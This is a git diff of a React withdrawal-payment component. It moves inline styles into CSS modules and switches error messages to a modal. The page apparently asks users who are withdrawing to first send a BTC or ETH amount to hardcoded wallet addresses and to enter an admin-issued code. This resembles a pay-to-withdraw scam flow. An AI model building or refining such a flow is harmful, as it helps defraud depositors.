@@ -1,14 +1,35 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/router';
 import { supabaseDb, supabase } from "../../database/supabaseUtils";
+import styles from "./WithdrawPayment.module.css";
+import Modal from "../Modal";
 
 const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, currentUser}) => {
     const router = useRouter();
     const [copystate, setCopystate] = useState("Copy");
     const [withdrawalCode, setWithdrawalCode] = useState("");
-    const [error, setError] = useState("");
+    // const [error, setError] = useState(""); // Replaced by Modal
     const [isVerifying, setIsVerifying] = useState(false);
     
+    // Modal State
+    const [modalConfig, setModalConfig] = useState({
+        isOpen: false,
+        type: '', // 'confirm', 'success', 'error'
+        title: '',
+        message: '',
+    });
+
+    const closeModal = () => setModalConfig(prev => ({ ...prev, isOpen: false }));
+
+    const showModal = (type, title, message) => {
+        setModalConfig({
+            isOpen: true,
+            type,
+            title,
+            message
+        });
+    };
+
     // Debug prices on mount
     useEffect(() => {
         console.log('WithdrawalPayment Prices:', { bitPrice, ethPrice, bitPriceType: typeof bitPrice, ethPriceType: typeof ethPrice });
@@ -24,9 +45,9 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
     const DEFAULT_COUNTDOWN = 15 * 60;
     const [countdown, setCountdown] = useState(DEFAULT_COUNTDOWN);
     const countdownRef = useRef(null);
-    const [showPopup, setShowPopup] = useState(false);
-    const [successMessage, setSuccessMessage] = useState("");
-    const [failureMessage, setFailureMessage] = useState("");
+    // const [showPopup, setShowPopup] = useState(false); // Replaced by Modal
+    // const [successMessage, setSuccessMessage] = useState(""); // Replaced by Modal
+    // const [failureMessage, setFailureMessage] = useState(""); // Replaced by Modal
     const [selectedCodeDoc, setSelectedCodeDoc] = useState(null);
     const [isProcessing, setIsProcessing] = useState(false);
     const isUserKycVerified = ((currentUser?.kyc_status) || '').toLowerCase() === 'verified';
@@ -69,8 +90,7 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
 
     const verifyWithdrawalCode = async () => {
         setIsVerifying(true);
-        setError("");
-
+        
         try {
             const identifierCandidates = [
                 currentUser?.idnum,
@@ -82,7 +102,7 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                 .filter(Boolean);
 
             if (!identifierCandidates.length) {
-                setError("Unable to verify your withdrawal code because your account is missing an identifier.");
+                showModal('error', 'Error', "Unable to verify your withdrawal code because your account is missing an identifier.");
                 return null;
             }
 
@@ -98,12 +118,12 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                 .maybeSingle();
 
             if (error || !data) {
-                setError("Invalid or expired withdrawal code");
+                showModal('error', 'Error', "Invalid or expired withdrawal code");
                 return null;
             }
 
             if (data.expires_at && new Date(data.expires_at).getTime() < Date.now()) {
-                setError("Withdrawal code has expired. Request a new one.");
+                showModal('error', 'Error', "Withdrawal code has expired. Request a new one.");
                 return null;
             }
 
@@ -111,7 +131,7 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
             return data;
         } catch (err) {
             console.error("Error verifying code:", err);
-            setError("Error verifying code. Please try again.");
+            showModal('error', 'Error', "Error verifying code. Please try again.");
             return null;
         } finally {
             setIsVerifying(false);
@@ -120,18 +140,18 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
 
     const handleTransacConfirmation = async () => {
         if (!withdrawalCode) {
-            setError("Please enter your withdrawal code");
+            showModal('error', 'Error', "Please enter your withdrawal code");
             return;
         }
 
         // Check KYC status before proceeding
         if (!isUserKycVerified) {
-            setError("KYC verification required. Please complete KYC verification before making a withdrawal.");
+            showModal('error', 'KYC Required', "KYC verification required. Please complete KYC verification before making a withdrawal.");
             return;
         }
 
         if (countdown === 0) {
-            setError("Payment window expired. Please initiate a new withdrawal.");
+            showModal('error', 'Error', "Payment window expired. Please initiate a new withdrawal.");
             return;
         }
 
@@ -140,26 +160,23 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
         if (!codeDoc) return;
 
         setSelectedCodeDoc(codeDoc);
-        setShowPopup(true);
+        showModal('confirm', 'Confirm Withdrawal', '');
     }
 
     const handleFinalConfirm = async () => {
         if (!selectedCodeDoc) {
-            setFailureMessage("No withdrawal code selected. Try again.");
+            showModal('error', 'Error', "No withdrawal code selected. Try again.");
             return;
         }
 
         // Check KYC status before processing withdrawal
         if (!isUserKycVerified) {
-            setFailureMessage("KYC verification required. Please complete KYC before withdrawing.");
-            setShowPopup(false);
+            showModal('error', 'KYC Required', "KYC verification required. Please complete KYC before withdrawing.");
             setIsProcessing(false);
             return;
         }
 
         setIsProcessing(true);
-        setFailureMessage("");
-        setSuccessMessage("");
 
         try {
             // mark code used
@@ -178,7 +195,7 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
 
             // Enforce minimum withdrawal amount at finalization as well
             if (Number.parseFloat(amount) < 200) {
-                setFailureMessage('Minimum withdrawal amount is $200');
+                showModal('error', 'Error', 'Minimum withdrawal amount is $200');
                 setIsProcessing(false);
                 return;
             }
@@ -230,16 +247,15 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                 console.warn("Could not update user balance:", balanceErr);
             }
 
-            setSuccessMessage("Withdrawal request submitted successfully.");
-            setShowPopup(false);
+            showModal('success', 'Success', "Withdrawal request submitted successfully.");
 
             // small delay so user can see success message before routing
             setTimeout(() => {
                 setProfileState("Withdrawals");
-            }, 900);
+            }, 2000);
         } catch (err) {
             console.error("Finalizing withdrawal failed:", err);
-            setFailureMessage("Could not complete withdrawal. Please try again later.");
+            showModal('error', 'Error', "Could not complete withdrawal. Please try again later.");
         } finally {
             setIsProcessing(false);
         }
@@ -265,56 +281,26 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
   };
 
   return (
-    <div className="paymentSect">
-        <h2>Confirm Payment</h2>
+    <div className={styles.paymentContainer}>
+        <h2 className={styles.title}>Confirm Payment</h2>
 
         {/* KYC Status Warning */}
         {!isUserKycVerified && (
-            <div style={{
-                backgroundColor: 'rgba(220, 18, 98, 0.1)',
-                border: '2px solid var(--danger-clr)',
-                borderRadius: '8px',
-                padding: '1rem',
-                marginBottom: '1rem',
-                display: 'flex',
-                flexDirection: 'column',
-                gap: '12px'
-            }}>
-                <div style={{
-                    display: 'flex',
-                    alignItems: 'center',
-                    gap: '0.8rem'
-                }}>
-                    <i className="icofont-warning" style={{ 
-                        fontSize: '1.5rem', 
-                        color: 'var(--danger-clr)',
-                        flexShrink: 0
-                    }}></i>
+            <div className={styles.kycWarning}>
+                <div className={styles.kycWarningContent}>
+                    <i className={`icofont-warning ${styles.kycWarningIcon}`}></i>
                     <div>
                         <strong style={{ color: 'var(--danger-clr)', display: 'block', marginBottom: '0.3rem' }}>
                             KYC Verification Required
                         </strong>
-                        <span style={{ fontSize: '0.9em', color: 'var(--text-clr1)' }}>
+                        <span className={styles.kycWarningText}>
                             You must complete KYC verification before you can withdraw funds.
                         </span>
                     </div>
                 </div>
                 <button
                     onClick={() => router.push('/kyc')}
-                    style={{
-                        background: 'var(--primary-clr)',
-                        color: 'white',
-                        border: 'none',
-                        borderRadius: '6px',
-                        padding: '10px 16px',
-                        fontSize: '0.9rem',
-                        fontWeight: '500',
-                        cursor: 'pointer',
-                        alignSelf: 'flex-start',
-                        transition: 'background 0.2s'
-                    }}
-                    onMouseOver={(e) => e.target.style.background = '#0556a3'}
-                    onMouseOut={(e) => e.target.style.background = 'var(--primary-clr)'}
+                    className={styles.kycButton}
                 >
                     Click here to complete your KYC
                 </button>
@@ -323,63 +309,26 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
         
         {/* KYC Verified Message */}
         {isUserKycVerified && (
-            <div style={{
-                background: 'linear-gradient(135deg, #067c4d 0%, #0a9b6b 100%)',
-                border: '2px solid #067c4d',
-                borderRadius: '10px',
-                padding: '1rem',
-                marginBottom: '1rem',
-                display: 'flex',
-                alignItems: 'center',
-                gap: '0.8rem',
-                boxShadow: '0 4px 15px rgba(6, 124, 77, 0.3)'
-            }}>
-                <div style={{
-                    backgroundColor: 'rgba(255, 255, 255, 0.2)',
-                    borderRadius: '50%',
-                    width: '40px',
-                    height: '40px',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    flexShrink: 0
-                }}>
-                    <i className="icofont-check" style={{ 
-                        fontSize: '1.5rem', 
-                        color: 'white',
-                        fontWeight: 'bold'
-                    }}></i>
+            <div className={styles.kycSuccess}>
+                <div className={styles.kycSuccessIcon}>
+                    <i className="icofont-check"></i>
                 </div>
-                <div>
-                    <strong style={{ 
-                        color: 'white', 
-                        display: 'block', 
-                        marginBottom: '0.2rem',
-                        fontSize: '1.1rem',
-                        fontWeight: 'bold',
-                        textShadow: '0 1px 2px rgba(0,0,0,0.1)'
-                    }}>
+                <div className={styles.kycSuccessContent}>
+                    <h3>
                         ✅ KYC Verified
-                    </strong>
-                    <span style={{ 
-                        fontSize: '0.9em', 
-                        color: 'rgba(255, 255, 255, 0.9)',
-                        lineHeight: '1.3'
-                    }}>
+                    </h3>
+                    <p>
                         Your identity has been verified. You can proceed with your withdrawal.
-                    </span>
+                    </p>
                 </div>
             </div>
         )}
 
-        {successMessage && <div className="toast success">{successMessage}</div>}
-        {failureMessage && <div className="toast error">{failureMessage}</div>}
-
-        <div className="mainPaymentSect">
+        <div className={styles.paymentDetails}>
             {withdrawData?.paymentOption !== 'Bank Transfer' ? (
                 <>
                     <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${calculateCryptoAmount(displayAmount, bitPrice, 'BTC')} BTC` : `${calculateCryptoAmount(displayAmount, ethPrice, 'ETH')} ETH`}</span> to</h3>
-                    <p>{withdrawData?.paymentOption === "Bitcoin" ? "Bitcoin Address:" : "Ethereum Address:"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
+                    <p className={styles.infoText}>{withdrawData?.paymentOption === "Bitcoin" ? "Bitcoin Address:" : "Ethereum Address:"} <span className={styles.copyAddress} onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
                 </>
             ) : (
                 <>
@@ -392,22 +341,17 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
             )}
         </div>
 
-        <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
-        <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your withdrawals in the Withdrawal section of your User-Account-Display-Interface.</p>
+        <p className={styles.infoText}>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
+        <p className={styles.infoText}>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your withdrawals in the Withdrawal section of your User-Account-Display-Interface.</p>
 
-        <div className="paymentMeta">
+        <div className={styles.paymentMeta}>
             <p>Payment window: <strong>{formatTime(countdown)}</strong></p>
             <p>Withdrawal amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
         </div>
 
-        <div className="codeInputSect">
-            <label style={{display: 'block', marginBottom: '12px', fontWeight: '600', textAlign: 'center'}}>Enter withdrawal code</label>
-            <div style={{
-                display: 'flex',
-                gap: '8px',
-                justifyContent: 'center',
-                marginBottom: '16px'
-            }}>
+        <div className={styles.codeInputSect}>
+            <label className={styles.codeLabel}>Enter withdrawal code</label>
+            <div className={styles.codeInputsContainer}>
                 {[0, 1, 2, 3, 4, 5].map((index) => (
                     <input
                         key={index}
@@ -443,36 +387,16 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                             const nextIndex = Math.min(pastedData.length, 5);
                             document.getElementById(`withdrawal-code-${nextIndex}`)?.focus();
                         }}
-                        style={{
-                            width: '48px',
-                            height: '56px',
-                            fontSize: '1.6rem',
-                            textAlign: 'center',
-                            border: '2px solid #ddd',
-                            borderRadius: '8px',
-                            outline: 'none',
-                            transition: 'all 0.2s',
-                            fontWeight: '700',
-                            backgroundColor: '#fff',
-                            color: '#333'
-                        }}
-                        onFocus={(e) => {
-                            e.target.style.borderColor = '#007EA7';
-                            e.target.style.boxShadow = '0 0 0 3px rgba(0, 126, 167, 0.2)';
-                        }}
-                        onBlur={(e) => {
-                            e.target.style.borderColor = '#ddd';
-                            e.target.style.boxShadow = 'none';
-                        }}
+                        className={styles.codeInput}
                     />
                 ))}
             </div>
-            <div style={{marginTop: 8, display: 'flex', gap: '10px', flexWrap: 'wrap'}}>
+            <div className={styles.actionButtons}>
                 <button 
                     type="button" 
                     onClick={handleTransacConfirmation} 
                     disabled={isVerifying || countdown === 0}
-                    style={{flex: '1', minWidth: '150px'}}
+                    className={styles.verifyBtn}
                 >
                     {isVerifying ? 'Verifying...' : 'Verify Code & Continue'}
                 </button>
@@ -488,38 +412,44 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                             } 
                         }));
                     }}
-                    style={{flex: '1', minWidth: '150px'}}
+                    className={styles.requestBtn}
                 >
                     Request Code from Admin
                 </button>
             </div>
-            {error && <p className='errorMsg'>{error}</p>}
         </div>
 
-        {/* Popup confirmation shown after code is verified */}
-        {showPopup && (
-            <div className="modalOverlay">
-                <div className="modalCard">
-                    <h3>Confirm Withdrawal</h3>
+        <Modal
+            isOpen={modalConfig.isOpen}
+            onClose={closeModal}
+            title={modalConfig.title}
+        >
+            {modalConfig.type === 'confirm' ? (
+                <div>
                     <p>Payment type: <strong>{withdrawData?.paymentOption}</strong></p>
                     <p>Amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
                     {withdrawData?.paymentOption === 'Bank Transfer' && (
-                        <>
-                            <p style={{fontSize: '0.9rem', marginTop: 12}}>
-                                <strong>Bank:</strong> {withdrawData?.bankName}<br/>
-                                <strong>Account:</strong> {withdrawData?.bankAccountNumber}<br/>
-                                <strong>Holder:</strong> {withdrawData?.bankAccountName}
-                            </p>
-                        </>
+                        <p style={{fontSize: '0.9rem', marginTop: 12}}>
+                            <strong>Bank:</strong> {withdrawData?.bankName}<br/>
+                            <strong>Account:</strong> {withdrawData?.bankAccountNumber}<br/>
+                            <strong>Holder:</strong> {withdrawData?.bankAccountName}
+                        </p>
                     )}
                     <p>Withdrawal Code: <strong>{withdrawalCode}</strong></p>
-                    <div className="modalActions">
-                        <button type="button" onClick={() => { setShowPopup(false); setSelectedCodeDoc(null); }} disabled={isProcessing}>Cancel</button>
-                        <button type="button" onClick={handleFinalConfirm} disabled={isProcessing}>{isProcessing ? 'Processing...' : 'Confirm Transaction'}</button>
+                    <div className={styles.modalActions}>
+                        <button type="button" onClick={closeModal} disabled={isProcessing} className={styles.modalCancelBtn}>Cancel</button>
+                        <button type="button" onClick={handleFinalConfirm} disabled={isProcessing} className={styles.modalConfirmBtn}>{isProcessing ? 'Processing...' : 'Confirm Transaction'}</button>
                     </div>
                 </div>
-            </div>
-        )}
+            ) : (
+                <div>
+                    <p>{modalConfig.message}</p>
+                    <div className={styles.modalActions}>
+                        <button onClick={closeModal} className={styles.modalConfirmBtn}>OK</button>
+                    </div>
+                </div>
+            )}
+        </Modal>
     </div>
   )
 }
